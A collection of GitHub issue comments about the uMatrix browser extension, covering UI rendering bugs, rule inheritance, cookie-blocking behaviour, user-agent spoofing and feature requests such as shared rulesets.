    "La-Li-Lu-Le-Lo": "I see now. I guess that's not the issue then.\nThere is still the problem that comes at 0:40 - 0:47 of the video\nWhen I uncheck the \"embedly.com\" site rule in the site scope (I don't know a better term for that. see: http://i.imgur.com/cP0vUje.png) It does NOT delete the inherit rule. I would assume that unchecking that rule would delete this rule, but at 0:52 you can see that after I refresh umatrix's page, the inherit rules are still there. Even though I clearly unchecked the \"embedly.com\" site rule.\nNow, once this happens, if you go to 1:17, you'll see that I'm trying to toggle the embedly.com script and embedly.com frame rules in the global scope, but it doesn't change anything in the site scope. I see now that I can't because of the graylist rules. However, there would have been no way for me to know a graylist rule was created because I assumed unchecking the \"embedly.com\" site rule would completely remove the graylist rule.\nSo really the big problem is that that the graylist rule is being created without being deleted after I uncheck the \"embedly.com\" site rule as in 0:40 - 0:47 in the video.\n. Okay, I see what you're saying. It would be hard to tell whether you should remove an inherited rule or not if you were to remove a global rule. This is a complicated issue to deal with.\nThe thing is with the way things are now, you can delete the global rule while inherit rule is in place. Then both the global scope and the local scope won't have any rules for the graylist rule to inherit from.\nSince there's the issue of accidentally deleting an inherit rule without the user meaning to, then how about this? You should only delete inherit rules if the parent rule that created it is deleted as well AND if inherit rule is temporary. You do not delete any inherit rules that are in the permanent rules. You wouldn't want to mess with any permanent rules. This way, if the user previously added inherit rules and saved it, they wouldn't be deleted. That's the best suggestion I can come up with at the moment. Although again, this is just guessing at the user's behaviour patterns.\nFor example, these are the Temporary rules umatrix has created before a commit:\nreddit.com embedly.com script inherit -> added\n-- inherit rule is created by umatrix for one reason or another and not committed yet\n* embedly.com script allow -> deleted\n-- this global rule has been deleted by the user.\nThe inherit rule is still here even though the global rule has been deleted. Therefore at this time, the inherit rule has nothing to inherit from and is unneeded. So you remove an inherited rule when the user hasn't committed changes for the temporary rule.\nIf all else fails, an optimize button in the My Rules pane would be nice.\nAs referenced in the other issue thread #13, \n\n\"I am trying to come up with a slight visual hint that a cell is explicitly graylisted -- there is currently none. I will be experimenting with some ideas of visual, as currently this can lead to confusion.\"\n\nAs for this, maybe you could add a filter with 80% opacity to indicate graylisted cells. At least some kind of visual hint would be good to avoid confusion in the future. \n. ",
    "bananamous": "I just requested to the admin that that user up there, the one that keeps causing shit on Github, gets permanently BANNED.\nAlso, Umatrix is one of the reasons I actively DO use the internet.  Umatrix ROCKS, and I have told all of my friends/family/people I meet in grocery stores about it.  Thank you, Umatrix developer, and keep up the marvelous work!!!\nCheers!\n. ",
    "reitzig": "@requiredregistration FWIW, blacklisting the offending subdomain globally has the effect you intend. There are several tracker/logger subdomains on the default blacklists, e.g. for Disqus. Blacklisted rows are not overwritten by vertical inheritance.\nFlaming the author in another issue is certainly no way to handle the situation. OS devs have no obligation to deviate from their vision for their project.\n. Is there a particular reason for declining this? Fonts, in particular, would be useful to allow without having to allow anything else.\n. I see. For my sensibilities (which allow for CSS and images from all not-blacklisted sources), that's okay. Thanks for clarifying.\n\nAlso, space is limited, I can't just keep adding columns.\n\nOut of curiosity: what restricts space? On my desktop screen there's plenty of room left, and it's not as if uMatrix had a particularly slim interface even now. ;)\n. I'm on Firefox:\n\nThat button \"Preferences\" does not lead to preferences but to the addon description.\n. ",
    "vlaszlo": "I've seen a similar kind of UI corruption two or three days ago, too, with the same uMatrix version in Firefox Nightly on Windows 10. A browser restart made it go away and I haven't seen it since.\n. ",
    "thewaywest": "NOT fixed. installed uMatrix now, FFX 48.0 running Ubuntu 14.04 clone (elementaryOS). With first click, it renders one-half the panel, vertically. Moving the cursor down into the panel and sliding back and forth renders the missing pieces.\nClicking, then moving the mouse directly right along the FFX icon bar seems to allow it to resolve -- but when I have the uMatrix icon to the far right, as desired, I have nowhere to go to do this.\n. I saw no improvement with a restart, so didn't mention it. Enough flavors of browser + Linux, assume there is some CSS/LESS tweak required. Works fine on my Windows box. \n\nOn Aug 22, 2016, at 22:12, jonnyrobbie notifications@github.com wrote:\n@debiangirl It's never been solved. It's just been worked around with browser restart. The underlying issue is still there.\n@thewaywest what happens when you restart ff?\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub, or mute the thread.\n. But notice -- I am on packaged FFX 48.0 distributed Ubuntu 14.04 clone\n(elementaryOS)... so maybe the only solution is to manually install the\nnightly build...\n\nFor a production product, though, you can't expect users to do this.\nHope there is a solution. Most sites I am able to wiggle the mouse and\nthe panel renders, but some are difficult. May have to go back to\nNoScript :/\nOn 22/08/16 23:15, jonnyrobbie wrote:\n\nWeird, I've had this issue only once when I created this thread, which\nwas worked around with ff restart and it's been fine ever since then.\nLatest ff nightly 51.0a1.\nWhen I click the uMatrix icon, it usually manages to sort itself out\nto proper size.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/587#issuecomment-241552994,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ANXhl78XMHtSU5jilBTR-HbN-8zyFTtaks5qihFwgaJpZM4JLVfJ.\n. \n",
    "jonnyrobbie": "@debiangirl It's never been solved. It's just been worked around with browser restart. The underlying issue is still there.\n@thewaywest what happens when you restart ff?\n. Weird, I've had this issue only once when I created this thread, which was worked around with ff restart and it's been fine ever since then. Latest ff nightly 51.0a1.\nWhen I click the uMatrix icon, it usually manages to sort itself out to proper size.\n. Ok, I've tried to disable Classic Theme restorer, as I've been using umatrix from the bottom addon panel. The scroll reset is no longer present, but on the other hand, the whole matrix looks messed up:\nhttp://i.imgur.com/aSo368Z.png. ",
    "dragon788": "@thewaywest If you install Google Chrome/Chromium on the same machine do you get similar artifacts with uMatrix in that browser?\nAlso I'm not sure what classifies this as a \"production product\"? You paid nothing for it, it is freely available, the source code is also fully accessible, there is no option for a paid support contract and the author works on it in his free time.. So I've seen this occasionally if you change the global zoom level in Chrome or your browser gets confused between HiDPI and non-HiDPI screens, but it doesn't appear to happen consistently. Sometimes changing the zoom from 100% to 150% and restarting Chrome/Chromium causes it, other times it doesn't. It would probably take a Selenium or other UI test to take snapshots and toggles through all the zoom levels to accurately reproduce.. I would agree that this isn't within the scope of the extension. You are requesting functionality that Chrome itself doesn't implement, the only thing incognito really does is enable automatic deletion of cookies and disables (some) of the autocomplete and URL history. What you are looking for is a completely separate profile per Willem's suggestion with everything disabled or better yet a self destructing profile or something like the Tor browser.. Thanks @WillemMali I actually had a very similar issue. It was indeed due to the fact that I had a small window and many extensions and the uMatrix icon was too close to the left side of the window and didn't allow itself to extend outside of the Chrome window's boundaries. I did notice that there is a \"large\" text font option in uMatrix which is awesome for my 4K 15\" laptop rather than having to up the default zoom/text size everywhere.. ",
    "prometheanfire": "And then I clear caches, refresh, and it's working again :D\n. ",
    "kirill9000": "Columns could be made narrower if their headers contain abbreviations or icons instead of wide labels (like \"cookie\"). Then there will be place for more columns.\n. > it allows much more than just media resources\nWebsockets? I don't see how they could be more dangerous than media.\n. > At least with image (which I plan to rename media) you know what you are allowing in.\nDetails about what types of resources column controls could be placed in it's tooltip.\n. Latest from AMO - 0.9.3.6.\n. Thank you.\n. I've tried on a new profile - works good. Yeah, there were leftovers in these prefs on my old profile.\n. @gorhill Did you try with network.http.speculative-parallel-limit set to 0 and network.predictor.enabled to false?. ",
    "rheber": "Red then?\n. ",
    "RobertVisser": "Raymond, Hi. It may have been eBay, itself. Issue is no longer present.\nThanks. Rob\nOn Wed, Jul 20, 2016 at 6:48 PM Raymond Hill notifications@github.com\nwrote:\n\nYour screenshots are not available.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/594#issuecomment-234107719,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AC8J1sF7pUSQZunN9TGFd_A5fxlaGVg1ks5qXqWmgaJpZM4JRHTe\n.\n. \n",
    "JoelAzaria": "I agree that this should be easier.  As a workaround for now, try pressing  ctrl+shift+U which is the shortcut for umatrix.  For some reason this doesn't work for me on some windows but most of the time it does.\nAnother workaround sometimes is to right-click the header bar and see the option to open as a tab.  That makes the extensions buttons show.\nhth.\n. I have little to add except that I use uMatrix for a long time have/use about a dozen Synology NASs and I do not see this behavior.\nGranted it's been a long time since I've touched a Synology box without umatrix running, but I have no such issues in DSM UI with umatrix.\nOne difference is that I do NOT use quickconnect.  Perhaps try accessing DSM directly and see if you still have a problem.. ",
    "dd23": "I can reproduce the issue when I enable uMatrix entirely for this domain. The problem disappears when I disable uMatrix for this domain.\nSee the following picture:\n\nWhen the login does not work, I can see several entries in the log (Firefox's web console, opened with Ctrl+Shift+K) like this one:\nContent Security Policy: The page's settings blocked the loading of a resource at self (\"script-src 'unsafe-eval' *\").\nThese entries are not there, when the login works.\n. Sorry, wasn't aware that there is a logger in uMatrix. But here we go: Upper half is the correctly working login, lower half fails.\n\nApparently scripts are blocked, even though this is not supposed to happen.\nThe IPv6 addresses are identical in all lines.\n. Yes, I have double-checked. Blocked and non-blocked IPs are exactly the same. \nI copied the logger output to a text editor and did a quick Ctrl-F for the IP and all lines were highlighted.\nAlso, there is no other IP shown in uMatrix. The screenshots above in post 3 show the complete matrix.\n. ",
    "allo-": "I guess i need to test on a profile with less addons ...\nWhat i currently changed was to set NoScript from \"allow main domain\" to \"allow global\", to test if i get the (almost) same behaviour with uMatrix alone without reloading twice per Temporary-Allow action.\nWith NoScript active i do not see this box at all. But the strange thing is, i see that the tile has an option \"allow javascript\", which is disabled here. I am not sure what possibly interferes there and what exactly causes the box there / to be removed\nNoScript allow main domain:\n\nNoScript allow global\n\nNo Box when loading slashdot via clicking on the screenshot. Allowed:\n- All Images\n- All CSS\n- (www.).slashdot.org\n- (a).fsdn.com\neverything else disallowed.\n. With a fresh profile with only speeddial and uMatrix i get your thumbnail.\n. As the slashdot poll now looks a bit broken like in your screenshot and i can reproduce this in a tab by disallowing all scripts on slashdot.\nI guess NoScript took over the whole scripting in the thumbnailer allowing the main domain and disallowing everything else, while now the javascript is disabled, because of the checkmark in the settings for this speeddial tile.\nSo it seems:\n- NoScript + uMatrix active + Javascript disabled for the thumbnail: No Box at all.\n- NoScript allow global + uMatrix active + Javascript disabled for the thumbnail: Scripts are running.\n- uMatrix active + Javascript disabled for the thumbnail: Scripts are not running, no box is shown.\n- uMatrix active + Javascript enabled for the thumbnail: Scripts are running(*), box is shown, but images are not loaded.\n(*) Maybe the box is hidden by another addon. I suspected uBlock, but i cannot reproduce loading it in a tab without allowing other scripts than the main domain, even when i disable uBlock (via its button, not in the addon manager)\nThank you for helping to debug with a whole other addon.\nWhen it works with NoScript uninstalled i am happy, as i wanted to replace it. Now i look into configuring if i can make sure that all plugins are click-to-play even when hidden first and then i will have the features i used from NoScript.\n. is there some option to block HTML5-Video by default? Setting * * plugin block doesn't prevent it.\n. ",
    "Ectoplasm": "\nLooks like the dynamic filtering pane on uBlock Origin does the same thing, but only the dynamic filtering pane. The main popup appears normal until you open the dynamic filtering pane, and returns to normal when you collapse it.\n. ",
    "ghajini": "here upload not work when umatrix is active\n. ",
    "alexara": "\nDid you also check referrer-spoofer, agent-spoofer, strict https?\n\nForgot about that, though I thought it's disabled as well if I turn off uMatrix for a certain page.\nSoltution: The agent-spoofer caused it somehow!\n. ",
    "sjamaan": "Thanks for your quick response! So if I understand it correctly, if I enable JS for site X, but disable cookies, uMatrix will wipe localStorage along with the cookies set by the site when I close the browser?\n. Thanks for the explanation.\nYou say uMatrix prevents the cookie from reaching the remote server, but can it guarantee that if the cookie is not httponly?  Then the JS code could just read it and send it in some other request (either XHR or insert an element with a href or src that communicates the data to the server). The same is true for localStorage of course..\n. ",
    "Tronic69": "@migueldemoura \nRedirections have to be done on server side and not on clients. I never saw a server redirecting https to http (only http to https, like I do it for all requests on my servers) and if you do this on a client you will get just 404s for you client side redirections (IMHO in at least 95% of requests). . ",
    "jputting": "This is an annoying bug in Umatrix which affects the user interface(UI) at any time you wish to use it to block or allow anything at all.\nThis is affects every website and it's a design flaw which would most likely require a redesign of the Umatrux user interface to correct.\nGorhill has NOT even bothered to acknowledge this bug is present even though I complained about this way back in August 2016. So the chance of this ever being fixed seems to be nonexistant.\nIt is seems very clear that he is NOT interested at all in fixing this even if Umatrix is not working properly when a monitor resolution is set a different resolution.. I completely agree with TriMoon, At the very least Gorhil should have acknowledged there is a fault and make people aware that he has a very full schedule for the foreseeable future.\nThis yet another example of the sheer arrogant, aggressive and attitude Gorhil adopts when anybody dare attempts to find find faults with his precious little side projects.\nMy parents always taught me that if something is worth doing it is worth doing properly to the best of your abilities or it's not worth doing it at all.. ",
    "powerman": "Thanks. Here is oneliner to convert (require Perl and JSON::XS perl module installed):\nsh\ncat ~/.mozilla/firefox/*.default/requestpolicy/policies/user.json | \n    perl -0777 -MJSON::XS -nE '\n        for (decode_json($_)->{entries}{allow}->@*) {\n            s/\\A\\*\\.//, s/\\A\\z/*/ for $_->{o}{h}, $_->{d}{h};\n            printf \"%s %s * allow\\n\", $_->{o}{h}, $_->{d}{h};\n        }\n    ' >requestpolicy-umatrix.txt\n. ",
    "WillemMali": "I don't think this feature would make a lot of sense as by design Chrome extensions share data between incognito and regular mode, but if you're on Linux and can do some scripting you can implement it yourself. The way to go about it would be:\n1. Create a separate Chrome profile for incognito browsing (you can do this by calling Chrome with a specific profile directory set, this is a command line parameter)\n2. Install uMatrix there\n3. Create a shortcut to Chrome with the special profile as a parameter, and the \"start in incognito\" parameter set\nThis would implement a separation between incognito blocklists and non-incognito blocklists. To get encrypted lists, I think it would be easiest to then:\n1. Encrypt your incognito folder\n2. Write a script that prompts for your encryption password, mounts/extracts the folder (in case of exctracting: don't forget to remove it once Chrome terminates!), and run Chrome with the parameters as described in 3\nThe same would go for Chromium, and I think Firefox also has profile/settings folder support.\n. Could you upload a screenshot of the problem to make it clearer what your issue is?\nThe impression I get is that your Matrix window is too large and clipped by the left edge of your browser, but I'd like to be sure.\nDo you think a uniform scaling setting that applies to the whole matrix view would solve your issue? I'm cautiously in support of this functionality because it could also benefit the vision impaired.\n@gorhill If you like I could try implementing a fix to this? I'm not sure what your stance is on pull requests so I'm checking with you first.\n. I went through all open issues and found these related feature requests:\nIssues solved by this FR:\n- #387 - [feature idea] ability to group rules to make them easier to find, modify and share\n(Implementing this FR would allow users to do this by making multiple rule files)\nIssues solved by this FR + an initial list of rule sets like in uBO:\n- #639 - Feature Request: Shared rules policy via http ('corporate rules')\n(The company making a custom uBlock build with a preselected list of rulesets would solve it)\n- #491 - Collect suggested rules for downloading for users\n- #430 - [Feature request] integrate uBO static rules**\n- #400 - [feature request] Tab/ability for 3rd party filter subscriptions like in uB\n. @Atavic, do you think that would actually be detrimental to uMatrix? I know of the possibility of using both, but a) that clutters up your toolbar b) it takes more processing power and c) it splits your logs into two parts which you now need to check both.\n@gorhill This is somewhat off-topic, but I volunteer to help moderate issues on the uMatrix issue tracker. I think I could help reduce the noise from feature requests (by merging if they're similar or deleting them if they're shoddy) and also help with some of the more mundane issues.\nEdit: I could also help by moving feature requests to the right place for feature requests (copying the content, adding links back and forth, closing the Github issue), but as I don't quite understand the reason for this segregation I'd very much appreciate it if you could comment on this for a sentence or two if you would like me to do that.. @sibte I think it'd be very useful, but how do 3rd party rulesets defeat the purpose of uMatrix? I could then i.e. have a working version of Gmail by default by using a 3rd party whitelist for popular sites, I think that'd be quite nice. I could also use a bunch of blacklists, which can't do anything malicious unless they all let the same crap through at the same time.\nI don't see why uMatrix can't have more high-level features; it's not necessarily bad to have the same useful features included in both uMatrix and uBlock Origin. I don't maintain uMatrix, so if @gorhill could shine some light on how this feature works and/or clashes with his design philosophy that would be a great help.\n. @Atavic There will be a slight overlap (both will have external/remote/3rd party rulesets, but the kinds of rules differ a lot), but without that overlap you will have to use both uBlock and uMatrix to get similar functionality, which isn't really supported and requires you to dig into the logs of both.\n@gorhill Could you please comment with your thoughts on this FR? I tried to do as much of the legwork for this as possible without making a PR, which I will still do if you think this idea can work within your vision for uBO.\nMy offer to assist you in the moderation and cleanup of the Github issue tracker stands, and I apologize if I offended you. I don't intend to waste your time, and I get that \"Here's some noise on your issue tracker, can I help moderate noise on your issue tracker?\" could be seen as pretty crass.. ",
    "Hobbybyte": "I read the whole Documentation and all Infos I could\nfound about uMatrix/Cookies before writing this\nand making all the tests :\nI did it twice, but it doesn't change anything.\nManual :\nSo, if you block cookies by uMatrix, a server which has set a\ncookie cannot read the cookie again -- and so, the cookie is blocked.\nBut the Server can read the complete Cookie under some circumstances.\n. First thanks for your answer.\nIf you don't delete the local Cookie, the site can read the old value :\n\nIf you manipulate the local Cookie :\n\nThis indicates for me, that the server can read the cookie\n. That makes clear our different Point of View.\nI wanted to know, how google can identify me with complete \nblacklisted Cookie Function in uMatrix until the Cookie is deleted : \nif e.g. google reads the Cookie in local Javascript, obfuscate it\nmathematically reversible and translate it into a Bitmap or JS Url \nand loads the Url, then the Google Server gets the contents of the \nlocal ID Cookie without any problems until the Cookie is deleted.\nSo i agree with you , its not a direct Issue of uMatrix, its an\ngenerally Problem of the way, how uMatrix handles the blocking\nof Cookies.\nIts useful for some circumstances to give the local Javascript code\nthe allowance to read the Contents of a Cookie, but then there are \nseveral ways to transfer the Cookie indirect to the Server without\nuMatrix have a Chance to block this in the existing manner.\nsorry for misinterpreting the sentence : \nCookies are prevented from leaving your browser\nI saw the opposite and wanted to know why\nThank you for spending time on this.\n. ",
    "kasoban": "This seems to have been partially fixed in PR #635 but only for the english locale and doesn't seem to be included in the current release from the chrome extension store as of now.\nAlso, this link is still broken in various other locales. The workflow seems a little broken to go through each language to update a link, and can easily lead to inconsistencies. Shouldn't links be externalized and used by reference in the locales?\n. ",
    "k-h": "\n. status-4-ever (an extension) \nThe bar under the titlebar gets too full.\n. It seems the window gets wider with each use and eventually wraps back to the correct size.  I can't of course see this except when it's smaller than my screen.  Firefox 49 runs too slow so I went back to 48.  Could that be a cause?\n. I made a copy of my profile and disabled all addons but: Status-4-evar, stylish, tab mix plus, tree style tab, ublock origin and umatrix and it still occurs:\n\nI will disable the rest and see.\n. This is the next time I clicked it.\n\n. Disabling all add-ons and restarting, still have the problem.\n. > You have a screenshot?\nIt looked the same.\nI just went back to  firefox 49 and it doesn't exhibit this problem.\n. Here is a screenshot of the second click:\n\nAnd the third click:\n\nFirefox 48 with umatrix the only extension.  The first click had no extra space at all.\n. I use an extension \"Stylish\" for that and it was disabled. I'm pretty sure I don't have any others.  But I have been using ff for a long time though and I might have made some years ago.  How would I tell?\n. > Did you modify the GUI on Firefox 49? Did you add/remove icons/toolbars?\nI don't believe so.  But I had already done that on the profile I had before I updated to FF49.\nBTW I have moved back to FF49 and the umatrix menu space thing was not happening except it started to do it once.  I tried a completely plain profile and I can't get it to happen again, and now going back to my normal profile it doesn't happen.\n. Thanks.\n\nif you click on the domain at the top left of the uMatrix panel you can change it to * to implement a global rule.\n\nBut that would allow everything in the panel wouldn't it?. Thanks.\nBTW I should add here that youtube.com is a pain because you have to allow it first, then you reload and you get the ytimg.com which you have to allow, then you have to reload and you get googlevideo.com which again you have to allow.  Phew.. ",
    "bizaff": "For what it's worth, I've seen this from time to time - not the whole screen full, but a large amount of white space to the right of the \"other\" column.\n. I'll assume it's not currently capable of this - any reason this won't/can't be done?  Could it be done with minimal UI support, just through the rules page?  I think it's a solid feature, and I'm willing to help..\n. ",
    "DirkSchmitt": "Yes and No ;-)\nAs I understand are the  adminSettings a \"lock down\" mechanism, which allows to ensure that the user can't escape the protection. For this purpose it seems to be sufficient.\nMy use case is to provide sensible default settings, which may be overruled by the user settings.\nThe scope is explicitly the rule: and matrix: configuration. This can't achieved by adminSettings.\n. uBO ? - currently I'm looking on the uMatrix extension.\n. ",
    "rEnr3n": "This may not be enough but it's a good start https://github.com/snyderp/web-api-manager. ",
    "CrazyPython": "@gorhill create a separate repository for issues and crowdsource people to tag valid issues, perhaps?\n. ",
    "thomas-gardner": "Hi @gorhill, how then can people view the old issues for this repo? I am trying to access 'Incompatibility with Vimperator \u00b7 Issue #228' but it keeps returning 404s.\n. ",
    "gcbw": "As someone who was guilty of opening a duplicate issue, in my defense the original did not have any good searchable terms. In the end, dups are annoying but they help to prevent dups later on since they add new terms.\nmaybe adding someone else as an admin?\nedit: ...and now i am trying to go to the original issue to see if there was a work around listed, and i can't :(. ",
    "dcousens": "@gorhill what if others could help with the filtering and only tag you in issues that met the CONTRIBUTING.md criteria?. ",
    "Riajyuu": "I believe I didn't add any per-scope rules that can be relevant.\non chrome://umatrix/content/dashboard.html#privacy, i simply tick everything but Strict HTTPS: forbid mixed content.\n. Yep, that would work. Could you fix that on next update?\n. If you guys have any interest:\nhttps://github.com/Rictusempra/uMatrix-Rules\nBut I am not sure what author's opinion will be. You may misunderstand me so let me put this more precisely:\nStep 1:\nI visit Google to search something with such a rule:\ngoogle.com * cookie block\nso Google search doesn't set cookie for me.\nStep 2:\nI go to drive.google.com but now I have to login\nProblem: I have to revert rule in step 1 to login as uMatrix treats google.com and drive.google.com as the same domain and applies with same domain-scope rules.\nExpectation: I hope to apply different rules for main domain and every sub-domains for a site.. @talklittle Could you explain why this is closed since I think this feature nice to have.. @zippy5 \n\nwould you consider adding/converting these as recipes as well?\n\nWhat did you suppose to mean exactly? If you are talking about samples in uMatrix wiki, there isn't too much I can do.. > Instead of being added as a filter list, they're\"recipes\" that you can toggle on from the puzzle piece icon within the uM popup.\n~Well, isn't that what this PR doing exactly?~\n\n~You can also confirm that via the given supportURL~\nMy bad. There was a strange mistake. Sorry for that. CC @gorhill . hmmmmmmm, that is, frankly, an insanely huge amount of work.\nBut I will try that.\n@gorhill I need your words here. If you wish to see those rules converted into recipes, I will try that. If not, perhaps leave them like that as rules.. @gorhill thanks for the reply. I will try whatever I can do.\nI still have two questions:\n\nhow to allow resources globally, specifically some CDN scripts library? You can find that in my rules files.\nhow to fit scope level? You can see the two repositories for the corresponding two scope levels of umatrix.. > Consider this a first draft, I will edit according to feedback.\n\nGreat, gratefully thx for your time, @gorhill . I will try to craft something.\nPlus, as a solution for scope-level fitting, here is what I suggested:\n\"umatrix-rules\": {\n  \"content\":\"recipes\",\n  \"title\": \"uMatrix Rules (Third-Party Contributed)\",\n  \"scopeLevel\": \"domain\",\n  \"contentURL\": \"https://raw.githubusercontent.com/uMatrix-Rules/uMatrix-Rules-Domain/master/rules.txt\",\n  \"supportURL\": \"https://umatrix-rules.github.io\"\n}\n\nIf not specific, occurs at every level for subscription.\nIf specific, occurs (& effective) only when uMatrix is set to the the targeted scope level.. ",
    "forkoz": "Heh, beat me to the punch. I'm unfortunately stuck with chrome on linux. uMatrix UA spoofing gives away my platform even in the current window. It makes you stand out a bit more to have windows or mac running on linux. \nThere was only one extension in the chrome store that changed this value and its only correct for mac (macintel is right, \"windows\" is not) I can confirm the iframe behavior with the extension I'm using as well. As an added bonus, the appversion gives away the real string too, at least on chrome. \nIn windows I have RAS and it mimics things surprisingly well. The iframe bug is not present there either.\nMy point in spoofing the browser/platform is so that exploit code targets the wrong setup and its proved by places with super invasive ads trying to serve me .DMGs because my mac runs \"slow\".. Spoof user agent doesn't work so hot anyways. Fails https://browserleaks.com/javascript\nI don't think it changes platform either which is critical since it makes iffy websites throw the wrong exploits at you. Certainly doesn't work in an iframe like all of the other extensions I've tried.. No replacement for RAS on chrome, sadly. No ras on FF when they use web extensions only. Also no proper UA spoofing on chrome at all. Maybe rubber glove still works but it breaks too many sites. Someone will have to write one.\nThe most comical is when they replace navigator.useragent but don't do platform or appversion. Umatrix isn't really a UA spoofer tho, its more of a web requests firewall. There are some auto cookie deleting extensions on chrome, they aren't 100% SDC but close enough. The one I tried was https://chrome.google.com/webstore/detail/cookie-autodelete/fhcgjolkccmbidfldomjliifgaodjagh?hl=en. ",
    "atomGit": "nope - wasn't on that page, didn't comment there and don't recall ever seeing it before\n. ",
    "SCmkQrK1NhwcWoPJF3FImaqHnG2PqPLWBt2GtSU": "Steps for reproduce:\n1. Connect to an IPv6 internet.\n2. Start Firefox and create a new profile.\n3. Install uMatrix.\n4. Open the page http://[2001:470:1:18::125]/ or http://[2001:470:1:18::119]/ (IPv6 address of ipv6.test-ipv6.com).\n5. Open uMatrix menu.\n6. Try to allow the scripts and not see the proper permits cells (as in https://web.archive.org/web/20170227031554/https://dump.bitcheese.net/images/tyvadut/Firefox:uMatrix:_IPv6%D0%BD%D0%B5_%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%B5%D1%82_0.png).. Tested on Firefox 51.0.1 (64 bit, release), OS Linux, uMatrix 0.9.3.6.\n667 is very similar. #597 is a bit like.. Also tested on Firefox 52 (64 bit, release). Reopen the bug, please..",
    "sibte": "+1 (sort of)\nI explicitly came here to check if there was some chatter about some way to centralise the ruleset. Mostly the ability to have a custom location for the ruleset and some simple logic for auto import / export. The user can always choose to serve it over some cloud service, http(s) or similar quite easily. That would solve the cross browser / machine headache with disabling / enabling and/or export/importing so often.  \nWhen it comes to third party rulesets I kinda think it defeats the whole purpose of an extension such as this.\n. @WillemMali mostly due to the fact that I don't think the rulesets will efficiently apply for the various users. As an initial starting point I can see the benefit for some users, but I believe your own ruleset will be just as fast to setup in practice. \nFor instance, our behavioural patterns, geography, preferences (security, network load etc) results in quite different rulesets and profiles (like I have different rulesets I import for different profiles). My assumption is that most rules would probably just be idle from a 3rd party rulesets. There will be conflicts with \"following\" rulesets (global changes vs local changes) so you might end up with our own ruleset anyways making 3rd party rulesets mostly about \"getting started\" or \"I dont want to thinker with this in practice\". And the latter is what I meant with the defeats the purpose comment. Besides, you can always import 3rd party rulesets already. \nSo instead of having shared features amongst e.g. uMatrix and uBlock origin, I would rather vote that they complement each other as they do now. Therefore I would rather focus on custom location for the rulesets with auto-import / export feature for sync across various devices/browsers as that is a huge timesaver. \nedit: typos\n. ",
    "Genda1ph": "uBlock and uMatrix have slightly different purposes.\nAs for manual importing: I have at least three instances of uMatrix to support and, frankly,. it's a pain to manually update every device. I'd very much appreciate if it could be predictably automated: i.e. automatically downloaded rulesets are merged and overridden by your custom rulesets.\nThis would make uMatrix so much nicer to use.. ",
    "927589452": "That would also be very useful for secured enterprise settings,\neg whitlisting enterprise/institution wide domains, \nto have enterprise apps working and still provide users the privacy and security of uMatrix.\nI would suggest a field in the import export view to autoimport a config from an URL at each start. ",
    "Tanath": "I've tried reinstalling uMatrix and there was no change. I also noticed the revert all and logger buttons are also missing. Here's a screenshot:\nhttps://imgur.com/a/HiFdU\nIt's the same on any site. That area is empty.\nI'm using Firefox 49.0.2 on Linux.\n. Er, not sure if I somehow missed this before or something changed, but the buttons are actually there, they're just invisible. Hovering does show the tooltip. I was sure I moused over them before.\n. I don't appear to. Didn't find anything in profile directory. The only extension worth looking at that modifies styles is Owl, but I checked with it off and there was no change.\n. Yes, I am. I've switched my theme a few times recently, so it's not any particular theme. If that's the reason though, it's weird it only affects some buttons and not others.\n. Well, I just tested with a dark on light theme and the buttons are visible. I won't use such a theme as it's harsh on my eyes, but the info is useful for troubleshooting. It is notable this problem does not occur on the Chrome version.\n. ",
    "p42n3": "I can confirm this, i've just learned about these invisible buttons because of this github issue, i didn't miss them before... :)\n@Tanath : i'm using a light-colored text on dark background theme on my desktop, maybe you too?\n. \"some themes styles are overriding uMatrix ones\" -no, probably not: as far as i can observe it, it's that developers/designers often define only foreground color but not background, or the other way round. So, the theme style changes the undefined color, but does not change (not override) the defined color.\nProbably the same here?\nBTW: i'm new to uMatrix, used NoScript and Request Policy combination before - great Addon, thanks!\n. ",
    "foxx": "@gorhill Macbook has a pretty powerful CPU, and happens on fresh install. Even so, I'm not sure how that would result in the frame being half hidden, surely if it was CPU related then it would be a laggy render rather than a totally broken one?\n. Also note that this problem only happens with uMatrix extension, and not other extensions (such as Audio EQ, which has a similarly sized popup)\n. Also related to https://github.com/gorhill/uMatrix/issues/423 and https://github.com/gorhill/uMatrix/issues/309\n. Any idea what the fix for this might be? Even if just a rough guess? Seems quite a few other people have been hit by this one too.\n. ",
    "Haikuch": "ok, so #625 is another closed issue that duplicates #78 that has been rejected by you but is not really the same what I am asking here about. I don't want to know the fingerprinting way, like the one asked at that time, but I would like to know what I'm really going to unblock when I click the matrix field. There a little hover effect would be really helpful for preotection.\n. ",
    "argiopetech": "Not sure how this was submitted... #665 is the complete issue. \n. Some extra platform info:\n$ google-chrome-stable --version\nGoogle Chrome 54.0.2840.90 \n$ uname -sr\nLinux 4.4.21-gentoo\nTested against uMatrix 0.9.9b2 loaded as an unpacked extension and 0.9.3.6 from the Chrome web store. uBlock Origin is installed but disabled, uBlock Origin Websocket is installed and operational.\n. I agree that * 192.168.100.1 * block should override * 192.168.100 * block since 192.168.100.1 is more specific, but my intuitive feeling is that the interaction with 1st-party in this case should work like subdomains. * google.com * block also blocks e.g., calendar.google.com.\nAs it is, it takes three ~~records~~ rules\n* 192 * block\n192 1st-party * block\n192 1st-party frame block\nto block a /8 block given the default uMatrix settings, but only one (* google.com * block) to block a domain and all its subdomains.\nWould you consider amending this behavior?\n. ",
